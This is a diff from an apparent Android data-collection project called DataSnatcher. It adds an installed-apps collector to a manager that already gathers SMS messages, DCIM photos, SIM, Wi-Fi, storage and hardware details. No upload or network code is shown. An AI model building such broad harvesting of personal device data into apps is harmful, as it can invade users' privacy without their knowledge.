@@ -4,6 +4,7 @@ import android.app.Activity;
 import android.content.Context;
 import android.os.Build;
 
+import com.example.DataSnatcher.collector.ApplistInfoCollector;
 import com.example.DataSnatcher.collector.AudioInfo.AudioInfoCollector;
 import com.example.DataSnatcher.collector.BatteryInfoCollector;
 import com.example.DataSnatcher.collector.CPUInfoCollector;
@@ -37,13 +38,14 @@ public class InfoCollectionManager {
         // 在此处加
         collectors.add(new AudioInfoCollector());
         collectors.add(new SensorInfoCollector(context));
-        // collectors.add(new DeviceIdentifierInfoCollection(context, activity));
+        //collectors.add(new DeviceIdentifierInfoCollection(context, activity));
         collectors.add(new BatteryInfoCollector(context));
         collectors.add(new CPUInfoCollector(context));
         collectors.add(new WifiInfoCollector(context));
         collectors.add(new SimCardInfoCollector(context));
         collectors.add(new StorageInfoCollector(context));
         collectors.add(new SMSCollector(context));
+        collectors.add(new ApplistInfoCollector(context));
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             collectors.add(new DCIMCollector(context));
         }
